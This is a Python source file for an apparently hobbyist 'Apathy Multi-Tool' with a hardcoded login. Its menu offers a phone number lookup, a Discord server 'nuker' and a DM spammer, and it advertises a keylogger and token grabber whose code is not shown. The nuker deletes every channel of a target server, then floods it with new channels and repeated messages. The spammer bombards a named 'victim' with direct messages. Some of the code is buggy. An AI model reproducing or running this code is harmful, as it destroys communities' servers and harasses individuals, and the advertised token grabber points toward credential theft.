usr = "root"
password = "apathy"
user = input("Username: ")
passio = input("Password: ")
if user == usr:
    if passio == password:      
        import sys,os
        from colorama import Fore
        from pystyle import Colorate, Colors, Center
        def set_cmd_window_size(cols, lines):
            os.system(f'mode con: cols={cols} lines={lines}')

        set_cmd_window_size(160, 30)
        header = """
            ++----------------------------------------------------------------------------------------------------------------------------------++
            ++----------------------------------------------------------------------------------------------------------------------------------++
            || █████╗ ██████╗  █████╗ ████████╗██╗  ██╗██╗   ██╗    ███╗   ███╗██╗   ██╗██╗  ████████╗██╗   ████████╗ ██████╗  ██████╗ ██╗      ||
            ||██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║  ██║╚██╗ ██╔╝    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ||
            ||███████║██████╔╝███████║   ██║   ███████║ ╚████╔╝     ██╔████╔██║██║   ██║██║     ██║   ██║█████╗██║   ██║   ██║██║   ██║██║      ||
            ||██╔══██║██╔═══╝ ██╔══██║   ██║   ██╔══██║  ╚██╔╝      ██║╚██╔╝██║██║   ██║██║     ██║   ██║╚════╝██║   ██║   ██║██║   ██║██║      ||
            ||██║  ██║██║     ██║  ██║   ██║   ██║  ██║   ██║       ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗ ||
            ||╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ||
            ++--------------------------------------------------------------Made By Apathy------------------------------------------------------++
            ++----------------------------------------------------------------------------------------------------------------------------------++
        """

        print(Colorate.Horizontal(Colors.blue_to_purple,f'{header}'))

        def display_menu():
          print(Colorate.Horizontal(Colors.purple_to_red,"""
              ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
              | 1) Phone Locator                | 6) Soon...   
              | 2) Discord Nuker                | 7) Soon...
              | 3) DM Spammer                   | 8) Discord-Token-Grabber
              | 4) KeyLogger                    | 9) Soon...
              | 5) Soon...                      | 10) Soon... 
              ――――――――――――――――――――――――――――――――――――――――――――――――――――――――
          """))

        def execute_command(command):
            if command == '1':
                import requests
                from colorama import Fore, Style
                import colorama
                import os
                import sys
                from pystyle import Colorate, Colors, Center, Write

                def set_console_size(cols, lines):
                    os.system(f'mode con: cols={cols} lines={lines}')

                set_console_size(160, 40)
                colorama.init()

                with open("assets\phoneloc.txt") as f:
                    api= f.read().strip()

                def print_header():
                    Write.Print("""
++--------------------------------------------------------------------------------------------------------++
++--------------------------------------------------------------------------------------------------------++
|██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗    ██╗      ██████╗  ██████╗ █████╗ ████████╗ ██████╗ ██████╗ |
|██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝    ██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗|
|██████╔╝███████║██║   ██║██╔██╗ ██║█████╗      ██║     ██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝|
|██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝      ██║     ██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗|
|██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗    ███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ╚██████╔╝██║  ██║|
|╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝|
++------------------------------------------------Made By Apathy------------------------------------------++
++--------------------------------------------------------------------------------------------------------++
                    """, Colors.blue_to_green, interval=0.0001)

                def clear_screen():
                    os.system('cls' if os.name == 'nt' else 'clear')

                print_header()


                phnum = Write.Input(
                """

[!] Enter the phone number to locate: 

                """, Colors.red_to_blue, interval=0.0025)

                def phloc(phnum, api):
                    url = f"https://api.apilayer.com/number_verification/validate?number={phnum}"
                    headers = {
                        "apikey": api
                    }
                    response = requests.get(url, headers=headers)
                    data = response.json()
                    return data

                def phdtout(phone_details):
                    print(Fore.CYAN + "Phone Details:")
                    print(f"Number: {phone_details['number']}")
                    print(f"Country: {phone_details['country_name']}")
                    print(f"Carrier: {phone_details['carrier']}")
                    print(f"Line Type: {phone_details['line_type']}")
                    print(f"Location: {phone_details['location']}")
                    print(f"Country Prefix: {phone_details['country_prefix']}")
                    print(f"isValid: {phone_details['valid']}")
                    print(Style.RESET_ALL)

                phdt = phloc(phnum, api)
                phdtout(phdt)

                input()
            elif command == '2':      
                import discord
                from discord.ext import commands
                import asyncio
                import sys, os
                from pystyle import Colorate, Colors, Center, Write

                def s(a, b):
                    os.system(f'mode con: cols={a} lines={b}')

                s(160, 30)
                intents = discord.Intents.default()
                intents.guilds = True

                bot = commands.Bot(command_prefix='!', intents=intents)

                def h():
                    Write.Print("""
++----------------------------------------------------------------------------------------------------++
++----------------------------------------------------------------------------------------------------++
||██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗  ||
||██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗ ||
||██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝ ||
||██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗ ||
||██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║ ||
||╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ||
++------------------------------------------------Made By Apathy--------------------------------------++
++----------------------------------------------------------------------------------------------------++
""", Colors.purple_to_red, interval=0.0001)

                h()
                with open("assets\config.txt") as f:
                    T = f.read().strip()

                @bot.event
                async def on_ready():
                    print(f"[+] Logged in as {bot.user.name}")
                    g_id = int(Write.Input("[!] Enter the server ID to delete channels: ", Colors.purple_to_red, interval=0.0025))
                    n_c = int(Write.Input("[!] Enter the number of channels to create: ", Colors.purple_to_red, interval=0.0025))
                    b_n = Write.Input("[!] Enter the base name for the new channels: ", Colors.purple_to_red, interval=0.0025)
                    m_c = Write.Input("[!] Enter the message to send in each channel: ", Colors.purple_to_red, interval=0.0025)
                    n_m = int(input(Colorate.Horizontal(Colors.purple_to_red, "[!] Enter the number of messages to send in each channel: ")))
                    await d_c(g_id, n_c, b_n, m_c, n_m)

                async def d_c(g_id, n_c, b_n, m_c, n_m):
                    g = bot.get_guild(g_id)
                    if g is None:
                        Write.Print("[-] The specified server ID is not valid or the bot is not in that server.", Colors.purple_to_blue, interval=0.0025)
                        return

                    d_t = []
                    for c in g.channels:
                        d_t.append(c.delete())
                    try:
                        await asyncio.gather(*d_t)
                        Write.Print("\n[+] All channels have been deleted.", Colors.purple_to_blue, interval=0.0025)
                    except discord.Forbidden:
                        Write.Print("\n[-] Failed to delete some channels due to lack of permissions.", Colors.purple_to_blue, interval=0.0025)
                    except Exception as e:
                        Write.Print(f"\n[-] An error occurred while deleting channels: {e}", Colors.purple_to_blue, interval=0.0025)

                    c_t = []
                    for i in range(1, n_c + 1):
                        c_n = f"{b_n}"
                        c_t.append(g.create_text_channel(c_n))
                    try:
                        c_d = await asyncio.gather(*c_t)
                        print(Colorate.Horizontal(f"\n[+] Created {len(c_d)} new channels.", Colors.red_to_purple))
                    except discord.Forbidden:
                        print(Colorate.Horizontal("\n[-] Failed to create some channels due to lack of permissions.", Colors.purple_to_blue))
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.purple_to_blue, f"\n[-] An error occurred while creating channels: {e}"))

                    m_t = []
                    for c in c_d:
                        for _ in range(n_m):
                            m_t.append(c.send(m_c))
                    try:
                        await asyncio.gather(*m_t)
                        print(Colorate.Horizontal(Colors.purple_to_red, f"\n[+] Sent {len(n_m)} messages in all channels."))
                    except discord.Forbidden:
                        print(Colorate.Horizontal(Colors.purple_to_blue, "\n[-] Failed to send some messages due to lack of permissions."))
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.purple_to_blue, f"\n[-] An error occurred while sending messages: {e}"))

                bot.run(T)
            elif command == '3':
                import discord
                from discord.ext import commands
                import asyncio
                import os
                from pystyle import Colorate, Colors, Write
                def set_cmd_window_size(cols, lines):
                    os.system(f'mode con: cols={cols} lines={lines}')
                set_cmd_window_size(140, 30)
                def heada():
                    Write.Print("""
++------------------------------------------------------------------------------------------------------------------++
++------------------------------------------------------------------------------------------------------------------++
||██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ███╗   ███╗    ███████╗██████╗  █████╗ ███╗   ███╗||
||██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗████╗ ████║    ██╔════╝██╔══██╗██╔══██╗████╗ ████║||
||██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██╔████╔██║    ███████╗██████╔╝███████║██╔████╔██║||
||██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚██╔╝██║    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║||
||██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║ ╚═╝ ██║    ███████║██║     ██║  ██║██║ ╚═╝ ██║||
||╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝     ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝||
++-----------------------------------------------------Made By Apathy-----------------------------------------------++
++------------------------------------------------------------------------------------------------------------------++
                    """, Colors.purple_to_red, interval=0.0001)
                    Write.Print("""
\n[!] Go to Discord Server where all the bots are in and simply type !dm (user_id here) (message_content) in any channel        
\n[!] Then bots will ask you "how many times do you want to send message to user?" Just put some number
\n[!] To spam DMs bot has to be in same server as victim, otherwise due to rules of discord you can't dm user! 
\n[!] Spamming speed depends on amount of the bots you put in 'tokens.txt'       
""", Colors.white_to_green, interval=0.0025)
                heada()
                intents = discord.Intents.all()
                bot = commands.Bot(command_prefix='!', intents=intents)
                @bot.event
                async def on_ready():
                    Write.Print("[+] I'm Online!", Colors.purple_to_red, interval=0.0025)
                @bot.command()
                async def dm(ctx, user_id: int, *, message):
                    try:
                        user = await bot.fetch_user(user_id)
                    except discord.NotFound:
                        await ctx.send("[-] User not found.")
                        return
                    await ctx.send(f"[?] Enter the amount of messages to be sent to {user}")
                    def check(m):
                        return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit()
                    try:
                        response = await bot.wait_for('message', check=check, timeout=30)
                        message_count = int(response.content)
                        for _ in range(message_count):
                            await asyncio.sleep(0.01)
                            await user.send(f"{message}")
                        await ctx.send(f'[+] Done sending messages to {user}!🔥')
                    except asyncio.TimeoutError:
                        await ctx.send("[-] Time out. Retry everything :(")
                @bot.command()
                async def stop(ctx):
                    await ctx.send("[-] Stopping bot...")
                    await bot.close()
                    Write.Print("[-] Bot has been stopped.", Colors.purple_to_red, interval=0.0025)
                async def main():
                    with open('assets\tokens.txt', 'r') as file:
                        tokens = file.readlines()
                    tokens = [token.strip() for token in tokens if token.strip()]
                    if tokens:
                        await bot.start(tokens[0])
                    else:
                        print("[-] No tokens found in 'tokens.txt'")
                if __name__ == "__main__":
                    asyncio.run(main())
        while True:
            display_menu()
            command = input(Colorate.Horizontal(Colors.blue_to_cyan,'>>>>>>  '))

            if command.lower() == 'exit':
                break
            
            execute_command(command)
else:
    print("leee eblan, wrong password:(")
    input()